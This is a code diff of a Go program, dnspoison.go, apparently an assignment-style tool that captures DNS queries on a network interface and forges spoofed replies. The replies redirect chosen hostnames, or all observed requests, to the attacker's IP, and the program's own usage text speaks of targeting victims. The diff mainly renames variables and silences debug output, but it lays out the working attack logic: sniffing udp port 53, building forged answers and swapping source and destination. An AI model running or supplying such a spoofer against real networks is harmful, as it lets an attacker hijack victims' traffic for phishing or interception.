@@ -1,4 +1,4 @@
-package poison
+package main
 
 import (
 	"flag"
@@ -13,9 +13,9 @@ import (
 )
 
 var (
-	ifcName       string // interface name
+	interfaceName string // interface name
 	hostFile      string
-	bpfFilter     string
+	bpf           string
 	defaultIP     net.IP
 	ipHostMapping map[string]string
 
@@ -32,19 +32,19 @@ var (
 
 // go run dnspoison.go [-i interface] [-f hostnames] [expression]
 func main() {
-	parseCommand()
+	parseCmd()
 
 	// opens a device and returns a handle
-	handle, err := pcap.OpenLive(ifcName, 1600, true, pcap.BlockForever)
+	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
 	if err != nil {
 		panic(err)
-	} else if err := handle.SetBPFFilter(bpfFilter); err != nil {
+	} else if err := handle.SetBPFFilter(bpf); err != nil {
 		panic(err)
 	}
 	defer handle.Close()
 
-	defaultIP = queryIfcAddr(ifcName)     // get ip addr relates to the specified interface
-	ipHostMapping = readMapping(hostFile) // read ip host mapping from file
+	defaultIP = queryIfcAddr(interfaceName) // get ip addr relates to the specified interface
+	ipHostMapping = readMapping(hostFile)   // read ip host mapping from file
 
 	setupDecoder()
 	for {
@@ -59,8 +59,8 @@ func main() {
 
 }
 
-func parseCommand() {
-	flag.StringVar(&ifcName, "i", "", "Live capture from the network device <interface> (e.g., eth0). If not specified, mydump should automatically select a default interface to listen on.")
+func parseCmd() {
+	flag.StringVar(&interfaceName, "i", "", "Live capture from the network device <interface> (e.g., eth0). If not specified, mydump should automatically select a default interface to listen on.")
 	flag.StringVar(&hostFile, "f", "", "Read a list of IP address and hostname pairs specifying the hostnames to be hijacked. If '-f' is not specified, dnspoison would forge replies to all observed requests with the chosen interface's IP address as an answer")
 	flag.Usage = func() {
 		_, _ = fmt.Fprintf(flag.CommandLine.Output(), "Usage of %s:\n", os.Args[0])
@@ -68,23 +68,23 @@ func parseCommand() {
 		fmt.Println("<expression> is a BPF filter that specifies a subset of the traffic to be monitored, which is useful for targeting a single victim or a group of victims")
 	}
 	flag.Parse()
-	bpfFilterArr := flag.Args()
-	if ifcName == "" { // interface is not specified, set as default device interface
+	bpfArr := flag.Args()
+	if interfaceName == "" { // interface is not specified, set as default device interface
 		ifs, _ := pcap.FindAllDevs()
-		ifcName = ifs[0].Name
+		interfaceName = ifs[0].Name
 	}
 	if flag.NArg() != 0 {
-		bpfFilter = strings.Join(bpfFilterArr, " ")
+		bpf = strings.Join(bpfArr, " ")
 	} else {
-		bpfFilter = "udp port 53"
+		bpf = "udp port 53"
 	}
-	// fmt.Println("Arguments:", ifcName, hostFile, strings.Join(bpfFilterArr, " "))
+	// fmt.Println("Arguments:", interfaceName, hostFile, strings.Join(bpfArr, " "))
 }
 
-func queryIfcAddr(ifcName string) net.IP {
+func queryIfcAddr(interfaceName string) net.IP {
 	interfaces, _ := net.Interfaces()
 	for i := range interfaces {
-		if interfaces[i].Name == ifcName {
+		if interfaces[i].Name == interfaceName {
 			addrs, err := interfaces[i].Addrs()
 			if err != nil {
 				panic(err)
@@ -97,7 +97,7 @@ func queryIfcAddr(ifcName string) net.IP {
 			for _, addr := range addrs {
 				ip, _, _ := net.ParseCIDR(addr.String())
 				if ip.To4() != nil {
-					fmt.Println("ip to interface", ifcName, ip)
+					fmt.Println("ip to interface", interfaceName, ip)
 					return ip
 				}
 			}
@@ -139,11 +139,11 @@ func setupDecoder() {
 
 func handlePackets(handle *pcap.Handle) {
 	fmt.Println("========== Packet captured! ==========")
-	fmt.Printf("DNS questions: total %v\n", dns.QDCount)
+	// fmt.Printf("DNS questions: total %v\n", dns.QDCount)
 	var i uint16
-	for i = 0; i < dns.QDCount; i++ {
-		fmt.Printf("[%v]: %v", i, string(dns.Questions[i].Name))
-	}
+	//for i = 0; i < dns.QDCount; i++ {
+	//	fmt.Printf("[%v]: %v\n", i, string(dns.Questions[i].Name))
+	//}
 
 	dns.QR = true // QR: true indicates a response packet
 	if dns.RD {   // RD(Recursion Desired): is set in a query and is copied into the response.
@@ -161,14 +161,14 @@ func handlePackets(handle *pcap.Handle) {
 		a := buildDNSAnswer(q)
 		if a.IP != nil {
 			matched = true
-			fmt.Printf("forged: type %v, [%v] -> [%v]", a.Type, string(q.Name), a.IP)
+			fmt.Printf("forged: type %v, [%v] -> [%v]\n", a.Type, string(q.Name), a.IP)
 			dns.Answers = append(dns.Answers, a)
 			dns.ANCount = dns.ANCount + 1
 			fmt.Printf("DNS answer total: %v\n", dns.ANCount)
 		}
 	}
 	if matched == false {
-		fmt.Println("no need to forge response")
+		// fmt.Println("no need to forge response")
 		return
 	}
 	// swap src/dst in each layer
